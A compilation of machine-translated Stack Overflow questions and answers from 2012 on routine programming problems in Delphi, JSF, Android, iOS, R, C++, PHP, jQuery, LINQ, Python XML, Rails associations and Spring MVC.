  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.Menus, Vcl.StdCtrls;

type
  TForm4 = class(TForm)
    PopupMenu1: TPopupMenu;
    Button1: TButton;
    fgddfg1: TMenuItem;
    fdgdfg1: TMenuItem;
    procedure FormCreate(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button1MouseDown(Sender: TObject; Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
  private
    { Private declarations }
    cMenuClosed: Cardinal;

  public
    { Public declarations }
  end;

var
  Form4: TForm4;

implementation

{$R *.dfm}

procedure DropMenuDown(Control: TControl; PopupMenu: TPopupMenu);
var
  APoint: TPoint;
begin
  APoint := Control.ClientToScreen(Point(0, Control.ClientHeight));
  PopupMenu.Popup(APoint.X, APoint.Y);
end;

procedure TForm4.Button1Click(Sender: TObject);
begin
  DropMenuDown(Button1, PopupMenu1);
  cMenuClosed := GetTickCount;
end;

procedure TForm4.Button1MouseDown(Sender: TObject; Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
  if (Button = mbLeft) and not ((cMenuClosed + 100) < GetTickCount) then
  begin
    ReleaseCapture;
  end;
end;

procedure TForm4.FormCreate(Sender: TObject);
begin
  cMenuClosed := 0;
end;

end. 
```

# java - 打开新页面时如何在 h:outputLink 中调用托管 bean

> ID：10597852
> 
> 赞同：0
> 
> 时间：2012-05-15T09:28:34.020
> 
> 标签：java, jsf, jsf-2

我有一个`h:outputLink`打开新的 JSF 页面并发送`h:param`.

```
<h:outputLink id="lnkHidden" action="#{HistoryLinkController.linkValue("test")}" value="HistoryLink.xhtml" style="display:none">
<f:param name="id" value="#{item.aSessionID}" />
</h:outputLink> 
```

我希望在单击它时将值发送到第二个托管 bean。我试图用它来实现它，`action="#{HistoryLinkController.linkValue("test")}"`但我得到了错误。我可以为此目的使用任何属性吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-17T04:07:21.893

Try using a `<h:commandLink>` in the following way and it should work fine

```
<h:commandLink id="hLink" value="History" action="#{HistoryLinkController.linkValue}" >         
 <f:param name="sessID" value="#{item.aSessionID}" />
</h:commandLink> 
```

and the bean "HistoryLinkController" should have a method like

```
public String linkValue(){
   // get "sessID" from FacesContext
   ...
   return "/HistoryLink.xhtml";
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T10:23:16.047

将 h:outputLink 替换为 h:commandLink。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T09:37:42.937

我还尝试导航到某个视图，同时将值传递给另一个 bean，但我没有得到它。但我得到的是---
如果可能的话，U 可以留在同一个 bean 类中，并`navigation rules`用于`faces-config.xml`导航到另一个页面。

并且在 ajax 中，`action`将比它的`actionListener`.

希望它可以帮助您找到方法...

# android - Android：AlarmManager 不工作长间隔值

> ID：10597853
> 
> 赞同：2
> 
> 时间：2012-05-15T09:28:39.243
> 
> 标签：android, alarmmanager

我正在使用`AlarmManager`小部件更新事务。我有不同的间隔值，如 5、10、15、30 分钟等。

如何打电话`AlarmManager`：

```
alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
Intent i = new Intent(context, MyService.class);
pi = PendingIntent.getService(context, 0, i, PendingIntent.FLAG_UPDATE_CURRENT);        

// Interval value, default 600 (600*1000 -> 10 min)
Long repeat = Long.parseLong(prefs.getString("update_preference", "600"));

// Set the manager
alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, Calendar.getInstance().getTimeInMillis(), 1000*repeat, pi); 
```

所以如果用户选择 5 或 10 分钟，没关系。但如果不是，我的意思是，用户选择更大的值，例如 15、30、60 分钟，`MyService`而不是尽快工作`setRepetaing`。

有什么不同或错误？

编辑：它立即工作 <30 分钟，但现在使用独特的请求代码工作超过 30 分钟。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:30:56.757

我认为您必须在 PendingIntent 中使用唯一的请求代码

[待处理意图的多个实例](https://stackoverflow.com/questions/3730258/mulitple-instances-of-pending-intent)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T09:36:12.137

```
pi = PendingIntent.getService(context, 12345, i, PendingIntent.FLAG_UPDATE_CURRENT); 
```

这可能有效，“0”不是唯一 ID 的最佳选择。

# ios - 播放缓存的 mp3 文件时出现 AVAudioPlayer 问题

> ID：10597854
> 
> 赞同：3
> 
> 时间：2012-05-15T09:28:42.117
> 
> 标签：ios, avaudioplayer

在我的应用程序中，我将 mp3 文件下载到 Library/caches 。AVAudioPlayer 无法使用 FileURL 播放此文件，示例代码：

```
_audioPlayer = [[AVAudioPlayer alloc] initWithContentsOfURL:fileUrl error:&error];
            if (error) {
                NSLog(@"%@",[error localizedDescription]);
            }
            _audioPlayer.delegate = self;
            [_audioPlayer prepareToPlay];
            [_audioPlayer setNumberOfLoops:-1];
            [_audioPlayer play]; 
```

URL 是这样的：file://localhost/Users/ ***** /Library/Application%20Support/iPhone%20Simulator/4.3.2/Applications/1A41C5EE-04D3-4C95-BAFE-9B6E04535F8F/Library/Caches/etude.mp3

启动时，调用此方法，- audioPlayerDecodeErrorDidOccur: error:。描述是：操作无法完成。（OSStatus 错误 560100710。）Google 对此错误代码只字未提。

然而，这个文件可以在 iTunes 和 AVAudioPlayer 中播放，当放入 app Bundle 时。我只是想不通。谁能告诉我如何解决它？

# r - 在R中重命名矩阵行

> ID：10597857
> 
> 赞同：1
> 
> 时间：2012-05-15T09:28:49.783
> 
> 标签：r, matrix

我有以下矩阵：

```
> dat

       [,1]      [,2]       [,3]        [,4]
foo 0.7574657 0.2104075 0.02922241 0.002705617
foo 0.0000000 0.0000000 0.00000000 0.000000000
foo 0.0000000 0.0000000 0.00000000 0.000000000
foo 0.0000000 0.0000000 0.00000000 0.000000000
foo 0.0000000 0.0000000 0.00000000 0.000000000
foo 0.0000000 0.0000000 0.00000000 0.000000000 
```

并给出这个：

```
> new_names <- c("f0","f1","f2","f3","f4","f5");
# where the length of new_names matches the number of rows in the dat matrix 
```

我怎样才能得到这个？

```
 [,1]      [,2]       [,3]        [,4]
f0 0.7574657 0.2104075 0.02922241 0.002705617
f1 0.0000000 0.0000000 0.00000000 0.000000000
f2 0.0000000 0.0000000 0.00000000 0.000000000
f3 0.0000000 0.0000000 0.00000000 0.000000000
f4 0.0000000 0.0000000 0.00000000 0.000000000
f5 0.0000000 0.0000000 0.00000000 0.000000000 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T09:44:26.433

也许是这样的？

```
dat <- matrix(c(c(0.7574657, 0.2104075, 0.02922241, 0.002705617), rep(0, 4*6-4)), ncol = 4, nrow = 6, byrow = TRUE)

rownames(dat) <- paste0("f", seq(0, nrow(dat)-1)) 
```

如果您已经有一个名称向量，那么

```
rownames(dat) <- new_names 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-03-04T20:40:33.797

试试这个：

> 行名(dat) <- c("f0","f1","f2","f3","f4","f5")

# c++ - 智能指针 (auto_ptr) 行为

> ID：10597858
> 
> 赞同：1
> 
> 时间：2012-05-15T09:28:53.253
> 
> 标签：c++, smart-pointers, auto-ptr

不确定是否有人已经问过这个问题，但我在这里看到了一个奇怪的行为：

我已经声明了两个类，一个是基类，一个是只用一个虚拟方法派生的`display()`。

```
class A {
public:
    virtual void display() {
        cout << "base class" << endl;
    }
};

class B:public A {
public:
    void display() {
        cout << "derived class" << endl;
    }
}; 
```

现在，在 中`main()`，如果我尝试声明一个`auto_ptr`of`A`并为其分配一个新实例`B`，

```
int main() {
    auto_ptr<A> *a = (auto_ptr<A>*)new B();
    a->display();
} 
```

我在编译时收到此错误：

> “`'class std::auto_ptr<A>'`没有名为‘display’的成员”

难道我做错了什么？有人可以解释这种行为吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:32:28.540

您正在创建一个指向`auto_ptr`. An`auto_ptr`是一个像指针一样工作的对象，因此您不需要添加`*`.

你可能想要：

```
auto_ptr<A> a(new B());
a->display(); 
```

尽管我必须推荐 Boost 的智能指针 ( `scoped_ptr`and `shared_ptr`) 或 C++11 的`std::unique_ptr`and `std::shared_ptr`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T09:32:37.137

```
auto_ptr<A> *a = (auto_ptr<A>*)new B(); 
```

那是在做一些非常奇怪的事情。如果你想创建一个对象并使用智能指针来管理它，那么用指向该对象的指针来初始化智能指针：

```
auto_ptr<A> a(new B);
a->display(); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-15T09:33:10.097

你为什么写`auto_ptr<A> *a`？不应该是这样的。因此，您收到此错误。应该是`auto_ptr<A> a(new B);`。[在这里](http://www.cplusplus.com/reference/std/memory/auto_ptr/auto_ptr/)阅读它是如何工作的。

# c++ - 时间花在哪里？

> ID：10597859
> 
> 赞同：-1
> 
> 时间：2012-05-15T09:28:54.813
> 
> 标签：c++

我有一个包含记录元素的 xml 文件。我正在将记录元素内的数据转换为 PCAP 格式。代码如下所示。在 do 循环中，我只花费了 6 毫秒，但是当我在循环的边界处花费时间时，它显示我花费了 43 毫秒.. 这种差异来自哪里？另外，我正在更新循环内的内存。这是可以接受的做法还是我应该将内存归零并重用它？重用会带来任何性能提升吗？循环内的时间如下图所示

2012-05-14 07:26:48 ThreadID(19404) TRACE：开始时间：1030466589，结束时间：1030466589

2012-05-14 07:26:48 ThreadID(19404) TRACE：开始时间：1030466590，结束时间：1030466590

2012-05-14 07:26:48 ThreadID(19404) TRACE：开始时间：1030466591，结束时间：1030466591

2012-05-14 07:26:48 ThreadID(19404) TRACE：开始时间：1030466591，结束时间：1030466591

2012-05-14 07:26:48 ThreadID(19404) TRACE：开始时间：1030466592，结束时间：1030466592

2012-05-14 07:26:48 ThreadID(19404) TRACE：开始时间：1030466593，结束时间：1030466593

2012-05-14 07:26:48 ThreadID(19404) TRACE：开始时间：1030466593，结束时间：1030466593

2012-05-14 07:26:48 ThreadID(19404) TRACE：开始时间：1030466594，结束时间：1030466594

2012-05-14 07:26:48 ThreadID(19404) TRACE：开始时间：1030466595，结束时间：1030466595

但是 do 循环边界的时间是 2012-05-14 07:26:48 ThreadID(19404) TRACE:start Time:1030466584,End Time:1030466627

```
 static struct tms st_cpu;
        static struct tms et_cpu;
        clock_t end_time;
        clock_t start_time;
        char szData[100] = {0};
        clock_t st_total_time;
        clock_t et_total_time;
        static struct tms st_total_cpu;
        static struct tms et_total_cpu;
        st_total_time = times(&st_total_cpu);
        do {
        char *pBuffer = new char[m_nBufferLen];
        memset(pBuffer,0,m_nBufferLen);
            if(fgets(pBuffer,m_nBufferLen,fpcap) != NULL)
            {
                    char *pRecord = NULL;
                    if((pRecord = strstr(pBuffer,"<rec ")) != NULL)
                    {
                            start_time = times(&st_cpu);
                            CXMLParser objXMLParser(pBuffer);
                            objXMLParser.ProcessRecord();
                            objPCAPGenerator.GeneratePCAPRecord(&objXMLParser);
                            end_time = times(&et_cpu);

                            sprintf(szData,"start Time:%ld,End Time:%ld",start_time,end_time);
                            CLog::PrintLog(DBG_TRACE,"%s",szData);

                            sprintf(szData,"Real Time: %ld,UserTime:%ld,SystemTime:%ld",
                                            end_time-start_time,
                                            (et_cpu.tms_utime + et_cpu.tms_cutime) - (st_cpu.tms_utime + st_cpu.tms_cutime),
                                            (et_cpu.tms_stime + et_cpu.tms_cstime) -(st_cpu.tms_stime + st_cpu.tms_cstime)
                                            );
                            CLog::PrintLog(DBG_TRACE,"%s",szData);
                    }
            }
            else
            {
                    bEnd = true;
            }
    }while(bEnd != true);

    et_total_time = times(&et_total_cpu);

    sprintf(szData,"start Time:%ld,End Time:%ld",st_total_time,et_total_time);
    CLog::PrintLog(DBG_TRACE,"%s",szData);

    sprintf(szData,"Total Real Time: %ld,Total UserTime:%ld,Total SystemTime:%ld",
                    et_total_time-st_total_time,
                    (et_total_cpu.tms_utime + et_total_cpu.tms_cutime) - (st_total_cpu.tms_utime + st_total_cpu.tms_cutime),
                    (et_total_cpu.tms_stime + et_total_cpu.tms_cstime) -(st_total_cpu.tms_stime + st_total_cpu.tms_cstime)
                    );
    CLog::PrintLog(DBG_TRACE,"%s",szData); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T09:39:24.623

您当然可以并且应该对您的代码进行概要分析，但仅从一瞥中，我就发现了两个基本问题：

1.  您正在为每次迭代重新分配缓冲区。这是必要的还是你可以使用相同的缓冲区？顺便说一句，您不需要在读取之前将其设置为 0，只需在读取字符串后添加一个尾随零。

2.  是否有必要在每次迭代中从文件中读取？如果文件很大并且无法放入内存，那当然是必要的。如果文件有一个已知的相对较小的大小，只需将其读取到一个大缓冲区，然后解析它，它会快得多。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:33:26.187

一般来说，分配内存是一项相对昂贵的操作，因此如果这是性能关键代码，您绝对应该重新使用分配的内存块。

另外，请记住删除您正在分配的内存。我没有看到它现在正在完成。

# magento - Magento 安装错误

> ID：10597864
> 
> 赞同：3
> 
> 时间：2012-05-15T09:29:17.693
> 
> 标签：magento, installation

我已经下载了`magento 1.7.0.0`然后我提取并复制到`www`我的 wamp 文件夹但是当我导航到目录时说`127.0.0.1/magento/`下面`Exception`

```
---------------------------
Visual Studio Just-In-Time Debugger
---------------------------
An unhandled win32 exception occurred in httpd.exe [568]. Just-In-Time debugging this exception failed with the following error: No installed debugger has Just-In-Time debugging enabled. In Visual Studio, Just-In-Time debugging can be enabled from Tools/Options/Debugging/Just-In-Time.

Check the documentation index for 'Just-in-time debugging, errors' for more information.
---------------------------
OK   
--------------------------- 
```

我无法解决它............

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-19T15:14:37.213

您是否尝试过在 php.ini 中扩展 max_execution_time ？将其设置为 1800。您可能还希望将内存限制更改为 1024MB。

取自[这个](http://www.magentocommerce.com/boards/errors.php/viewthread/279012/#t385498)线程。

# php - 如何在此日期时间字符串的时间上添加一个小时？

> ID：10597869
> 
> 赞同：38
> 
> 时间：2012-05-15T09:29:38.177
> 
> 标签：php

这是我正在使用的日期时间字符串的示例：

```
Tue May 15 10:14:30 +0000 2012 
```

这是我尝试添加一个小时的尝试：

```
$time = 'Tue May 15 10:14:30 +0000 2012';
$dt = new DateTime($time);
$dt->add(new DateInterval('P1h')); 
```

但是第二行给出了无法转换的错误。

谢谢。

* * *

## 回答 #1

> 赞同：85
> 
> 时间：2012-05-15T09:32:58.367

您应该`T`在时间规范部分之前添加一个：

```
$time = 'Tue May 15 10:14:30 +0000 2012';
$dt = new DateTime($time);
$dt->add(new DateInterval('PT1H')); 
```

请参阅`DateInterval` [构造函数](http://php.net/manual/en/dateinterval.construct.php)文档：

> 格式以字母 P 开头，表示“句号”。每个持续时间段由一个整数值表示，后跟一个时间段指示符。*如果持续时间包含时间元素，则规范的该部分**前面有字母 T***。

[（重点补充）]

* * *

## 回答 #2

> 赞同：25
> 
> 时间：2016-02-01T00:19:31.730

以前的答案工作正常。但是，我通常在我的外部托管网站中使用 datetime modify。查看[php 手册](https://www.php.net/manual/en/datetime.modify.php)以获取更多信息。使用建议的代码，它应该像这样工作：

```
$time = 'Tue May 15 10:14:30 +0000 2012';
$dt = new DateTime($time);
$dt->modify('+ 1 hour'); 
```

对于那些不使用面向对象的人，只需以这种方式使用它（第一行 DateTime 只是为了给这个线程带来一些新的东西，我用它来检查服务器时间）：

```
$dt = new DateTime("@".$_SERVER['REQUEST_TIME']);  // convert UNIX epoch to PHP DateTime
$dt = date_modify($dt, "+1 hour"); 
```

最好的，

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-05-15T09:33:24.470

使用**[`strtotime()`](http://php.net/manual/en/function.strtotime.php)**：

```
$time = 'Tue May 15 10:14:30 +0000 2012';
$time = strtotime($time) + 3600; // Add 1 hour
$time = date('D M j G:i:s O Y', $time); // Back to string
echo $time; 
```

# events - jQuery click / on(click) 事件不会在 FF 中触发？

> ID：10597871
> 
> 赞同：4
> 
> 时间：2012-05-15T09:29:43.390
> 
> 标签：events, javascript-events, onclick, jquery

以下代码：单击事件（关闭登录框）不会在 FF 中触发（但是 webkit-browser 工作。而且 slideToggle click 事件在所有浏览器中都有效）。有人知道为什么吗？

非常感谢您的帮助！

## HTML

```
<div class="loginbox" id="loginbox">
    <div class="loginbox_close" id="loginbox_close"></div>
    ...
    <input type="button" value="Login" class="btn_login"></div>
</div> 
```

## jQuery

```
$(document).ready(function() {

    $('#menu').on('click', '#menu_login', function() {
            alert('test'); // this DOES fire, works in all browsers
        $('#loginbox').slideToggle(240,'swing');
    });
    $('#loginbox').on('click', '#loginbox_close', function() {
        alert('test'); // does not fire in FF, however webkit browser work!
        $('#loginbox').slideUp(240,'swing');
    });
}); 
```

## CSS

```
.loginbox {
    width:164px;
    padding:10px 18px 14px 18px;
    border:1px solid #CCC;
    border-top:0px;
    position:absolute;
    margin-left:780px;
    background:#678;
    opacity:0.9;
    box-shadow:inset 20px 40px 80px 4px #789,0 2px 8px #ABC;
    }

.loginbox_close {
    width:20px;
    height:20px;
    float:right;
    background:#EEE;
    cursor:pointer;
    position:absolute;
    margin-left:150px;
    } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T09:44:12.640

因为您使用的是委托事件，所以点击只会在从`#loginbox_close`.

[这是您的代码的一个工作示例，](http://jsfiddle.net/FMtuk/)其中`#loginbox_close`以红色标出。单击此框，您将看到该事件有效。

这[是一个更完整的版本](http://jsfiddle.net/FMtuk/1/)，直接从上面使用您的代码，还添加了红色边框。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:34:48.757

你最好使用这个：

```
$(document).ready(function() {
    $('#menu_login').click(function() {
        alert('test'); // this DOES fire, works in all browsers
        $('#loginbox').slideToggle(240,'swing');
    });
    $('#loginbox_close').click(function() {
        alert('test'); // does not fire in FF, however webkit browser work!
        $('#loginbox').slideUp(240,'swing');
    });
}); 
```

它应该工作。有了这个，您将单击事件直接分配给 menu_login 和 loginbox div。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T09:44:15.587

如果登录框是使用 ajax 加载的，您可以使用：

```
$('#loginbox_close').live('click',function() {
    ...
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-15T11:08:30.130

好像`</div>`后面的输入太多了，删掉吧。

```
<div class="loginbox" id="loginbox">
<div class="loginbox_close" id="loginbox_close"></div>
...
<input type="button" value="Login" class="btn_login">
</div> 
```

# linq - Linq 查询建议？

> ID：10597875
> 
> 赞同：0
> 
> 时间：2012-05-15T09:29:58.637
> 
> 标签：linq, linq-to-sql, linq-to-objects

我在我的应用程序中使用 linq2sql 我只是坚持这个简单的查询。

我的存储过程返回以下

```
id  order   type        text    
1   1   header      Personal details    
2   2   body text   Name    
3   3   body text   Address 
4   4   body text   Pincode 
5   5   body text   Age 
6   6   body text   DOB 
7   7   header      Employment details
8   8   body text   company name    
9   9   body text   role    
10  10  body text   salary  
11  11  header      FAQ 
12  12  sub header  what happens if i leave early?
13  13  body text   bonus amount 
```

我喜欢在`Dictionary<string,List<myType>>`

```
class mytype 
{ 
  string type;
  string text;
} 
```

我需要的输出将是

```
 personal details , <body text ,Name>
               <body text ,Address>
          <body text ,Pincode>
            <body text ,age>
            <body text ,DOB>

  Empolyment details, <body text ,company Name>
              <body text ,role>
              <body text ,salary> 
```

谁能告诉我如何实现这个linq？

# python - 解析一个xml文件

> ID：10597877
> 
> 赞同：-1
> 
> 时间：2012-05-15T09:30:07.887
> 
> 标签：python, xml

我有一个xml文件：

```
<one>
 <a>sth</a>
 <b>sth</b>
 <c>sth</c>
</one>
<one>
 <a>x</a>
 <b>y</b>
 <c>z</c>
</one> 
```

我想要的是使用 xml.dom 从 xml 中检索名称“a”、“b”、“c”，即节点“one”下的子节点

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:34:54.700

退房`xml.etree.ElementTree`。

[http://docs.python.org/library/xml.etree.elementtree.html](http://docs.python.org/library/xml.etree.elementtree.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T10:47:54.497

XML 文件应该像这样的格式

```
<?xml version="1.0" ?>
<ones>
<one>
 <a>sth</a>
 <b>sth</b>
 <c>sth</c>
</one>
<one>
 <a>x</a>
 <b>y</b>
 <c>z</c>
</one>
</ones> 
```

您可以尝试以下代码：

```
from xml.dom import minidom

xmldoc = minidom.parse('filePath')
root = xmldoc.documentElement

ones = root.getElementsByTagName('one')

L = []
for one in ones:
    m = {}
    #print onn.getElementsByTagName('a')[0].childNodes[0].nodeValue
    #print n.getElementsByTagName('b')[0].childNodes[0].nodeValue
    #print n.getElementsByTagName('c')[0].childNodes[0].nodeValue
    for n in one.childNodes:
         if n.nodeType == n.ELEMENT_NODE:
                 m[n.nodeName] =n.firstChild.nodeValue
    L.append(m) 
```

# ruby-on-rails - 如何通过关联在 has_many 中使用回调？

> ID：10597878
> 
> 赞同：27
> 
> 时间：2012-05-15T09:30:09.317
> 
> 标签：ruby-on-rails, ruby-on-rails-3, callback, has-many-through

我有一个通过 has_many 与 Project 模型关联的 Task 模型，并且需要在通过关联删除/插入之前操作数据。

由于“[自动删除连接模型是直接的，不会触发销毁回调。](https://guides.rubyonrails.org/association_basics.html#the-has-many-through-association) ”我不能为此使用回调。

在任务中，我需要所有 project_ids 来计算保存任务后项目的值。如何通过关联禁用删除或更改删除以销毁 has_many？这个问题的最佳实践是什么？

```
class Task
  has_many :project_tasks
  has_many :projects, :through => :project_tasks

class ProjectTask
  belongs_to :project
  belongs_to :task

class Project
  has_many :project_tasks
  has_many :tasks, :through => :project_tasks 
```

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2012-05-15T12:15:59.447

似乎我必须使用关联[回调](http://guides.rubyonrails.org/association_basics.html#association-callbacks) `before_add`，`after_add`或`before_remove``after_remove`

```
class Task
  has_many :project_tasks
  has_many :projects, :through => :project_tasks, 
                      :before_remove => :my_before_remove, 
                      :after_remove => :my_after_remove
  protected

  def my_before_remove(obj)
    ...
  end

  def my_after_remove(obj)
    ...
  end
end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-09-03T19:31:06.687

这就是我所做的

在模型中：

```
class Body < ActiveRecord::Base
  has_many :hands, dependent: destroy
  has_many :fingers, through: :hands, after_remove: :touch_self
end 
```

在我的 Lib 文件夹中：

```
module ActiveRecord
  class Base
  private
    def touch_self(obj)
      obj.touch && self.touch
    end
  end
end 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-03-30T13:43:51.307

更新加入模型关联，Rails 添加和删除集合上的记录。要删除记录，Rails 使用该`delete`方法，并且此方法不会调用任何[销毁回调](https://guides.rubyonrails.org/active_record_callbacks.html#destroying-an-object)。

您可以在删除记录时强制`destroy`Rails调用。`delete`为此，请安装 gem [replace_with_destroy](https://rubygems.org/gems/replace_with_destroy)并将选项传递`replace_with_destroy: true`给**has_many**关联。

```
class Task
  has_many :project_tasks
  has_many :projects, :through => :project_tasks,
            replace_with_destroy: true
  ...
end

class ProjectTask
  belongs_to :project
  belongs_to :task

  # any destroy callback in this model will be executed
  #...

end

class Project
  ...
end 
```

这样，您就可以确保 Rails 调用所有的[销毁回调](https://guides.rubyonrails.org/active_record_callbacks.html#destroying-an-object)。[如果您使用偏执狂](https://github.com/rubysherpas/paranoia)，这可能非常有用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-05-27T03:14:01.583

似乎添加`dependent: :destroy`到`has_many :through`关系会破坏连接模型（而不是删除）。这是因为[CollectionAssociation#delete](https://github.com/rails/rails/blob/master/activerecord/lib/active_record/associations/collection_association.rb#L188)内部引用了`:dependent`用于确定是否应该删除或销毁传递的记录的选项。

所以在你的情况下，

```
class Task
  has_many :project_tasks
  has_many :projects, :through => :project_tasks, :dependent => :destroy
end 
```

应该管用。

# ios - iPhone/iPad同时下载和播放

> ID：10597884
> 
> 赞同：0
> 
> 时间：2012-05-15T09:30:26.840
> 
> 标签：ios

我想通过应用程序同时下载和流式传输和下载视频。有视频很重所以转换成 m4u8 格式并使用 VOD 实时流媒体 cocept 在 MPMoviePlayer 中播放它们。如何在播放时同时下载实时流媒体视频。你能建议我吗。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T12:48:34.670

以下是播放电影的代码，希望这有用..

```
 NSURL *fileURL = [NSURL URLWithString:@"<Video URL>"];
        [self playMovie:fileURL];

-(IBAction)playMovie:(NSString *) theURL 
{
    NSURL    *fileURL    =   [NSURL fileURLWithPath:theURL];
    MPMoviePlayerController *moviePlayerController = [[MPMoviePlayerController alloc] initWithContentURL:fileURL];

    [[NSNotificationCenter defaultCenter] addObserver:self
                                             selector:@selector(moviePlaybackComplete:)
                                                 name:MPMoviePlayerPlaybackDidFinishNotification
                                               object:moviePlayerController];

    [self.view addSubview:moviePlayerController.view];
    moviePlayerController.useApplicationAudioSession = NO;
    moviePlayerController.fullscreen = YES;
    [moviePlayerController play];
}

- (void)moviePlaybackComplete:(NSNotification *)notification
{
    MPMoviePlayerController *moviePlayerController = [notification object];
    [[NSNotificationCenter defaultCenter] removeObserver:self
                                                    name:MPMoviePlayerPlaybackDidFinishNotification
                                                  object:moviePlayerController];

    [moviePlayerController.view removeFromSuperview];
    [moviePlayerController release];
} 
```

**使视频能够流式传输**

1.  视频应为 .mp4 格式。
2.  所有视频都应使用 Mac 中的 Miro Video Converter（或类似转换器）进行转换，并使其兼容在 iPhone、iPad 和 Android 设备上播放。转换后的视频将在移动设备中播放。但是，只有在从服务器下载完整视频后，视频才会播放。
3.  要制作视频流，必须将视频的元数据移动到视频的开头。为此，我们必须使用名为 Medadata mover 的工具对视频进行编码。
4.  然后最终的视频与流媒体兼容并且能够在所有移动设备上播放。然后视频必须通过 FTP 传输到所需的虚拟主机。例如 demo.com/videos/test.mp4。
5.  然后可以在 iPhone 或 android 应用程序中配置视频并进行流式传输。

**查看 Apple Live Streaming** [HTTP实时流媒体的更多信息](https://stackoverflow.com/questions/6592485/http-live-streaming)

# jquery - 基于 jQuery Mobile 中的选择值加载表单元素？

> ID：10597885
> 
> 赞同：0
> 
> 时间：2012-05-15T09:30:34.387
> 
> 标签：jquery, android, mobile

我在我的应用程序中使用 jQuery Mobile。我想根据选择值显示一些表单字段。这是我的 jQuery 代码

```
$( document ).bind( "pageinit", function( event, data ) {
$("#marrystatus").css("display","none");

    $("#marital_status").click(function(){
    if ($('#marital_status option:selected').val() == "Married" ) {
        $("#marrystatus").slideDown("fast"); //Slide Down Effect

    } else {
        $("#marrystatus").slideUp("fast");  //Slide Up Effect

    }
 }); 
```

});

这是我的 HTML 代码

```
 <li id="marrystatus" data-role="fieldcontain" > 

    <label for="marriedto"></label> 
    <input type="text" name="marriedto" id="marriedto" 
placeholder="Married To" /> 

    <label for="marryanidate"></label> 
    <input type="text" name="marryanidate" id="marryanidate" 
placeholder="Marrige Anniversary Date (DD/MM/YYYY)" /> 
  </li> 
```

该代码在 Windows 7 上的 Google Chrome 等普通浏览器中运行良好，但在我的 Android 上，它不起作用。他们有什么解决办法吗？

# java - 控制器类未加载弹簧

> ID：10597887
> 
> 赞同：0
> 
> 时间：2012-05-15T09:30:56.070
> 
> 标签：java, spring, spring-mvc

我正在尝试做一些示例应用程序。但是当我试图显示一个没有任何内容的视图时，我得到的输出就像“请求的资源（）不可用”。请纠正我哪里错了..

网页内容/index.jsp

```
<% 
System.out.println("--inside index--");
response.sendRedirect("newUser.jav"); %> 
```

网页内容/WEB-INF/web.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd" id="WebApp_ID" version="3.0">
  <display-name>xHaiSpring</display-name>
  <welcome-file-list>
    <welcome-file>index.html</welcome-file>
    <welcome-file>index.htm</welcome-file>
    <welcome-file>index.jsp</welcome-file>
    <welcome-file>default.html</welcome-file>
    <welcome-file>default.htm</welcome-file>
    <welcome-file>default.jsp</welcome-file>
  </welcome-file-list>

  <servlet>
    <servlet-name>dispatcher</servlet-name>
    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
    <load-on-startup>1</load-on-startup>
  </servlet>

  <servlet-mapping>
    <servlet-name>dispatcher</servlet-name>
    <url-pattern>*.jav</url-pattern>
  </servlet-mapping>

</web-app> 
```

WebContent/WEB-INF/dispatcher-servlet.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:p="http://www.springframework.org/schema/p"
    xmlns:context="http://www.springframework.org/schema/context"
    xsi:schemaLocation="http://www.springframework.org/schema/beans
    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd
    http://www.springframework.org/schema/context
    http://www.springframework.org/schema/context/spring-context-3.0.xsd">

    <bean class="org.springframework.web.servlet.view.InternalResourceViewResolver" id="viewResolver"
        p:prefix="/JSP/" p:suffix=".jsp">
    </bean>

</beans> 
```

控制器文件

```
package com.mycontroller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.servlet.ModelAndView;

@Controller
public class UserController{
    @RequestMapping(value="/newUser", method=RequestMethod.GET)
    public ModelAndView newUserForm()
    {
            System.out.println("inside controller");
        return new ModelAndView("registerUser");
    }

} 
```

我在 WebContent/JSP/ 中有一个 registerUser.jsp，这是一个空白的 jsp 页面

